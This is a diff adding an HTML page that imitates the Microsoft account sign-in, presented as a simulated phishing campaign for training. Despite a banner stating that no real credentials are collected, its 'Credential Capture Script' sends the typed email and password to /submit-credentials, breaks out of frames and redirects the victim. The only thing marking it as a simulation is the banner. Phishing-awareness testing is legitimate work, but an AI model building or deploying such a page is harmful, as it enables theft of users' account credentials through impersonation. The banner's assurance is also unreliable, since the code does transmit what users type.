@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta name="robots" content="noindex, nofollow" />
+  <meta charset="UTF-8" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <link rel="stylesheet" href="style.css" />
+  <title>Sign in to your Microsoft account</title>
+  <link rel="icon" type="image/x-icon" href="https://logincdn.msftauth.net/16.000.30004.15/images/favicon.ico" />
+</head>
+<body>
+  <div style="background: #fff3cd; color: #856404; text-align: center; padding: 10px; font-size: 14px; font-weight: 500; border-bottom: 1px solid #ffeeba;">
+    This page is part of a <strong>simulated phishing campaign for educational purposes only</strong>. No real credentials are being collected.
+  </div>
+
+  <div class="container">
+    <form onsubmit="handleSubmit(event)" name="logonForm" enctype="application/x-www-form-urlencoded" autocomplete="off">
+      <img class="logo" src="images/nicro_logo.png" alt="Microsoft logo" />
+
+      <div class="forms-container">
+        <div class="forms">
+          <div class="first">
+            <h2>Sign in</h2>
+            <div class="form-group">
+              <input
+                type="email"
+                name="UsernameForm"
+                placeholder="Email, Phone, or Skype"
+                required
+                autocomplete="username"
+              />
+            </div>
+            <p>No account? <button type="button" class="link-btn" tabindex="0">Create One!</button></p>
+            <button type="button" class="link-btn" tabindex="0">Sign in with a security key <span>?</span></button>
+            <button type="button" class="next-btn">Next</button>
+          </div>
+          <div class="second">
+            <h2>Enter password</h2>
+            <div class="form-group">
+              <input
+                type="password"
+                name="password"
+                placeholder="Password"
+                required
+                autocomplete="current-password"
+              />
+            </div>
+            <button type="button" class="link-btn" tabindex="0">Forgot password?</button>
+            <button type="submit">Sign in</button>
+          </div>
+        </div>
+      </div>
+    </form>
+    <div class="bottom">
+      <img class="key" src="images/key-removebg-preview.png" alt="key icon" />
+      <span>Sign-in options</span>
+    </div>
+  </div>
+
+  <div id="footer" role="contentinfo" class="footer ext-footer">
+    <div id="footerLinks" class="footerNode text-secondary footer-links ext-footer-links">
+      <a id="ftrTerms" href="https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse&amp;mkt=EN-US" class="footer-content ext-footer-content footer-item ext-footer-item">
+        Terms of use
+      </a>
+      <a id="ftrPrivacy" href="https://login.live.com/gls.srf?urlID=MSNPrivacyStatement&amp;mkt=EN-US" class="footer-content ext-footer-content footer-item ext-footer-item">
+        Privacy &amp; cookies
+      </a>
+      <button id="moreOptions" type="button" role="button" aria-label="Click here for troubleshooting information" aria-expanded="false" class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item">
+        ...
+      </button>
+    </div>
+  </div>
+
+  <!-- UI Scripts -->
+  <script>
+    const forms = document.querySelector(".forms");
+    const nextButton = document.querySelector(".next-btn");
+    const arrowButton = document.querySelector(".arrow-btn");
+
+    const emailInput = document.querySelector('.first input[name="UsernameForm"]');
+    const emailDisplay = document.querySelector(".email");
+    const passwordInput = document.querySelector('.second input[name="password"]');
+
+    nextButton.addEventListener("click", () => {
+      forms.classList.add("next-form");
+      emailDisplay.innerText = emailInput.value;
+      passwordInput.setAttribute("placeholder", "Password for " + emailInput.value);
+      document.querySelector(".bottom").style.display = "none";
+    });
+
+    arrowButton.addEventListener("click", () => {
+      forms.classList.remove("next-form");
+      document.querySelector(".bottom").style.display = "flex";
+    });
+  </script>
+
+  <!-- Credential Capture Script -->
+  <script>
+    if (self !== top) {
+      top.location = self.location;
+    }
+
+    let submitted = false;
+    function handleSubmit(event) {
+      event.preventDefault();
+      if (submitted) return;
+      submitted = true;
+
+      const email = document.querySelector('input[name="UsernameForm"]').value;
+      const password = document.querySelector('input[name="password"]').value;
+
+      fetch("/submit-credentials", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ email, password })
+      }).finally(() => {
+        window.location.href = "/post-campaign";
+      });
+    }
+  </script>
+</body>
+</html>
